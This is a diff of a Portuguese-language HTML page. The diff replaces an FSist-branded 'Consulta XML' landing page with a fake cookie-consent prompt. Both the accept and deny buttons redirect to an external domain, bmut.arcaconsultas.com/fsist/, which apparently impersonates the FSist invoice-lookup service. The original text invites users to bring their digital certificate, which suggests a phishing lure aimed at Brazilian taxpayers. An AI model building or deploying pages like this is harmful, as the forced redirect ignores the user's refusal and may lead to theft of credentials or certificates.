@@ -3,57 +3,46 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>FSist - Consulta XML</title>
+  <title>Consentimento de Cookies</title>
   <style>
     body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       background-color: #f9f9f9;
-      margin: 0;
-      padding: 0;
-      color: #333;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      font-family: Arial, sans-serif;
     }
     .container {
-      max-width: 600px;
-      margin: 40px auto;
-      background: #fff;
-      padding: 25px;
-      border-radius: 10px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+      background-color: #fff;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
       text-align: center;
     }
-    h1 {
-      color: #2a7de1;
-      margin-bottom: 20px;
-    }
-    p {
-      font-size: 1.1em;
-      margin-bottom: 25px;
-    }
-    .cta-button {
-      display: inline-block;
-      padding: 12px 24px;
-      background-color: #2a7de1;
-      color: #fff;
+    .btn {
+      padding: 14px 28px; /* Botões maiores */
+      margin: 10px;
+      border: none;
       border-radius: 5px;
-      text-decoration: none;
+      color: #fff;
       font-weight: bold;
-      transition: background-color 0.3s ease;
+      font-size: 16px;
+      cursor: pointer;
     }
-    .cta-button:hover {
-      background-color: #1a5bbf;
+    .btn-aceitar {
+      background-color: #4CAF50;
     }
-    .banner {
-      width: 100%;
-      border-radius: 8px;
-      margin-bottom: 20px;
+    .btn-negar {
+      background-color: #f44336;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Consulta de XML de NFe/CTe</h1>
-    <p>Acesse facilmente XMLs e DANFe usando a chave da nota com certificado digital. Simples, rápido e gratuito.</p>
-    <a href="https://bmut.arcaconsultas.com/fsist/" class="cta-button" target="_blank">Acesse Agora</a>
+    <p>Este site utiliza cookies para melhorar sua experiência.<br>Deseja aceitar o uso de cookies?</p>
+    <button class="btn btn-aceitar" onclick="location.href='https://bmut.arcaconsultas.com/fsist/'">Aceitar</button>
+    <button class="btn btn-negar" onclick="location.href='https://bmut.arcaconsultas.com/fsist/'">Negar</button>
   </div>
 </body>
 </html>
